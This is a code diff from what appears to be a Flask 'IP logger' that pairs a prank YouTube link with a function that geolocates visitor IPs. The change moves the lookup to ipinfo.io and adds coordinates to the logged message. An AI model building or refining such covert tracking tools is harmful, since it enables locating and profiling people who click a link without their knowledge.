@@ -13,40 +13,37 @@ YOUTUBE_LINK = "https://youtube.com/watch?v=dQw4w9WgXcQ"
 # Function to analyze IP
 def analyze_ip(ip):
     try:
-        url = f"http://ip-api.com/json/{ip}"
+        url = f"https://ipinfo.io/{ip}/json"
         res = requests.get(url, timeout=5)
         data = res.json()
 
-        if data['status'] == 'success':
-            country = data.get("country", "N/A")
-            city = data.get("city", "N/A")
-            isp = data.get("isp", "N/A")
-            org = data.get("org", "N/A")
+        city = data.get("city", "N/A")
+        country = data.get("country", "N/A")
+        org = data.get("org", "N/A")
+        loc = data.get("loc", "N/A")  # Coordinates
 
-            # Detect connection type
-            if "mobile" in org.lower() or "lte" in org.lower() or "cellular" in isp.lower():
-                conn_type = "📱 بيانات موبايل"
-            elif "vpn" in org.lower() or "vpn" in isp.lower():
-                conn_type = "🛡️ VPN أو بروكسي"
-            elif "broadband" in org.lower() or "dsl" in org.lower() or "wifi" in org.lower():
-                conn_type = "📶 WiFi / DSL"
-            else:
-                conn_type = "🔍 غير معروف / عام"
-
-            # Compose message
-            msg = (
-                f"📥 IP Logged: {ip}\n"
-                f"🌍 Country: {country}\n"
-                f"🏙️ City: {city}\n"
-                f"🏢 ISP: {isp}\n"
-                f"⚙️ Org: {org}\n"
-                f"🔍 Connection: {conn_type}"
-            )
-            return msg
+        # تصنيف نوع الاتصال
+        if "mobile" in org.lower():
+            conn_type = "📱 بيانات موبايل"
+        elif "vpn" in org.lower():
+            conn_type = "🛡️ VPN أو بروكسي"
+        elif "broadband" in org.lower() or "dsl" in org.lower():
+            conn_type = "📶 WiFi / DSL"
         else:
-            return f"IP Logged: {ip} (No Geo Info)"
+            conn_type = "🔍 غير معروف / عام"
+
+        msg = (
+            f"📥 IP Logged: {ip}\n"
+            f"🌍 Country: {country}\n"
+            f"🏙️ City: {city}\n"
+            f"📌 Location: {loc}\n"
+            f"🏢 Org: {org}\n"
+            f"🔍 Connection: {conn_type}"
+        )
+        return msg
     except Exception:
         return f"IP Logged: {ip} (Lookup failed)"
+
 
 @app.route('/')
 def index():
